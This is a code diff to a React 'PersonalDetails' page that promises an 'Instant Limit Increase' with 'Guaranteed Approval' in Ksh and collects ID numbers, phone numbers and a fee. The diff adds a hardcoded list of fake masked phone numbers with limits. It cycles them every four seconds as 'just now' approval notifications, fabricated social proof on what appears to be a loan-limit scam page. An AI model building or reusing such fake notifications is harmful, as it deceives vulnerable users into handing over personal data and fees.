@@ -6,8 +6,27 @@ const PersonalDetails = () => {
   const navigate = useNavigate();
   const { state } = useLocation();
 
+
+  const notifications = [
+  { phone: "0708****85", limit: 45000 },
+  { phone: "0712****34", limit: 30000 },
+  { phone: "0722****91", limit: 25000 },
+  { phone: "0733****56", limit: 35000 },
+  { phone: "0745****23", limit: 20000 },
+  { phone: "0756****78", limit: 15000 },
+  { phone: "0767****12", limit: 40000 },
+  { phone: "0778****45", limit: 25000 },
+  { phone: "0789****67", limit: 30000 },
+  { phone: "0791****89", limit: 45000 },
+];
+
   // Get dynamic limit & fee from state or sessionStorage
   const [limitData, setLimitData] = useState<{ amount: number; fee: number } | null>(null);
+
+    const [currentNotification, setCurrentNotification] = useState(notifications[0]);
+    const [showNotification, setShowNotification] = useState(true);
+
+  
 
   useEffect(() => {
     if (state && state.amount && state.fee) {
@@ -19,6 +38,21 @@ const PersonalDetails = () => {
       if (storedLimit) setLimitData(storedLimit);
     }
   }, [state]);
+
+    // Change notification every 4 seconds
+    useEffect(() => {
+      const interval = setInterval(() => {
+        setShowNotification(false);
+        
+        setTimeout(() => {
+          const randomIndex = Math.floor(Math.random() * notifications.length);
+          setCurrentNotification(notifications[randomIndex]);
+          setShowNotification(true);
+        }, 300);
+      }, 4000);
+  
+      return () => clearInterval(interval);
+    }, []);
 
   const [idNumber, setIdNumber] = useState("");
   const [phone, setPhone] = useState("");
@@ -68,6 +102,15 @@ const PersonalDetails = () => {
         <p className="subtitle">
           Instant Limit Increase • Guaranteed Approval
         </p>
+      </div>
+
+        {/* NOTIFICATION OVERLAY */}
+      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
+        <div className="notification-icon">✅</div>
+        <div className="notification-content">
+          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
+          <div className="notification-time">• just now</div>
+        </div>
       </div>
 
       <hr />
